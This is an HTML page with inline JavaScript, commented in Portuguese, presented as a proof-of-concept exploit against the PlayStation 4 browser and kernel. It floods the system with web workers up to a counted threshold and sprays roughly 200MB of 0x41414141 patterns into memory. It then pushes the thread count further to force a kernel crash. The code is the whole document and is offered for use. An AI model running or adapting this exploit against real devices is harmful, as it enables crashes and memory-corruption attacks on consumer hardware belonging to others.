<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Sniper Exploit PoC200</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #status { font-size: 24px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        #counter { font-size: 80px; font-weight: bold; color: #333; }
        .log { color: #888; font-size: 14px; margin-top: 10px; }
        button { font-size: 24px; padding: 15px 30px; cursor: pointer; background: #900; color: #fff; border: 2px solid #f00; width: 100%; }
    </style>
</head>
<body>

    <div id="status">AGUARDANDO INÍCIO...</div>
    <div id="counter">0</div>
    <div id="log" class="log"></div>
    
    <button onclick="runExploitSequence()">INICIAR SEQUÊNCIA DE EXPLOIT</button>

    <script>
        // CONFIGURAÇÃO DE PRECISÃO
        const TARGET_ZONE = 415; // Paramos aqui para fazer o Spray
        const FATAL_PUSH = 425;  // Empurramos até aqui para garantir o crash
        
        // PADRÃO DE SPRAY (O "Veneno")
        // 0x41414141 = "AAAA". Se o kernel tentar executar isso, ele crasha com um erro específico.
        const SPRAY_PATTERN = 0x41414141; 
        
        let count = 0;
        let sprayStore = [];

        // O Worker que causa o stress (mantido idêntico ao que causou crash em 418)
        const workerCode = `
            function deep(n) {
                const v = new Float64Array(128);
                if (n > 0) deep(n-1);
            }
            deep(10); 
            postMessage("Done");
        `;
        const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));

        function log(msg) {
            document.getElementById('log').innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
        }

        function setStatus(msg, color="#0f0") {
            document.getElementById('status').innerText = msg;
            document.getElementById('status').style.color = color;
        }

        function spawnThread() {
            new Worker(url).onmessage = () => {};
            count++;
            document.getElementById('counter').innerText = count;
        }

        function runExploitSequence() {
            setStatus("FASE 1: Enchendo Threads...", "#ff0");
            
            let fastInterval = setInterval(() => {
                // Sobe rápido até perto da zona de perigo
                if(count < 350) {
                    for(let i=0; i<5; i++) spawnThread();
                } 
                // Vai devagar (passo a passo) até o ponto de pausa
                else if(count < TARGET_ZONE) {
                    spawnThread();
                } 
                // Chegou no ponto de pausa (415)
                else {
                    clearInterval(fastInterval);
                    performHeapSpray();
                }
            }, 50); // Intervalo de 50ms (como no teste anterior)
        }

        function performHeapSpray() {
            setStatus("FASE 2: PAUSA - INJETANDO HEAP SPRAY...", "#0ff");
            document.body.style.backgroundColor = "#001133"; // Azul escuro
            
            // Dá um tempo para o Kernel "respirar" e aceitar nossas alocações
            setTimeout(() => {
                try {
                    // Aloca 300MB de "AAAA"
                    for (let i = 0; i < 200; i++) {
                        let buffer = new ArrayBuffer(1024 * 1024); // 1MB
                        let view = new Uint32Array(buffer);
                        for (let j = 0; j < view.length; j++) {
                            view[j] = SPRAY_PATTERN;
                        }
                        sprayStore.push(view);
                    }
                    log("Spray injetado na memória com sucesso.");
                    
                    // Vai para a fase final após 1 segundo
                    setTimeout(triggerFatalCrash, 1000);
                    
                } catch (e) {
                    log("Erro no Spray: " + e.message);
                    triggerFatalCrash(); // Tenta mesmo assim
                }
            }, 500);
        }

        function triggerFatalCrash() {
            setStatus("FASE 3: DETONANDO (415 -> " + FATAL_PUSH + ")", "#f00");
            document.body.style.backgroundColor = "#300"; // Vermelho escuro
            document.getElementById('counter').style.color = "#fff";

            let deathInterval = setInterval(() => {
                spawnThread();
                
                // Se passar do limite fatal e não desligar, algo estranho aconteceu
                if(count >= FATAL_PUSH) {
                    clearInterval(deathInterval);
                    setStatus("FALHA? Console sobreviveu.", "#fff");
                }
            }, 1000); // 1 thread por segundo, bem devagar para dar tempo do Kernel ler o Spray
        }
    </script>
</body>
</html>

